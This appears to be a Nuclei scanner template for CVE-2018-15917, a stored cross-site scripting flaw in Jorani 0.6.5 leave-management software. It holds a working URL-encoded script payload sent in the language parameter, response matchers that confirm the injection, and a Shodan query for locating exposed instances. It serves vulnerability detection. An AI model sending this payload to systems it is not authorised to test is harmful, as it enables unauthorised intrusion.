http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert(document.domain)</script>
    - _jorani
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /session/language?last_page=session%2Flogin&language=en%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&login=&CipheredValue=
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /session/login HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2018-15917
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:jorani_project:jorani:0.6.5:*:*:*:*:*:*:*
    cve-id: CVE-2018-15917
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
    epss-percentile: 0.91397
    epss-score: 0.04217
  description: 'Persistent cross-site scripting (XSS) issues in Jorani 0.6.5 allow
    remote attackers to inject arbitrary web script or HTML via the language parameter
    to session/language.

    '
  metadata:
    max-request: 2
    product: jorani
    shodan-query: title:"Login - Jorani"
    vendor: jorani_project
    verified: true
  name: Jorani Leave Management System 0.6.5 - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/45338
  - https://nvd.nist.gov/vuln/detail/CVE-2018-15917
  - https://github.com/bbalet/jorani/issues/254
  - https://github.com/JavierOlmedo/JavierOlmedo
  remediation: 'Upgrade to the latest version to mitigate this vulnerability.

    '
  severity: medium
  tags: cve,cve2018,jorani,xss,jorani_project
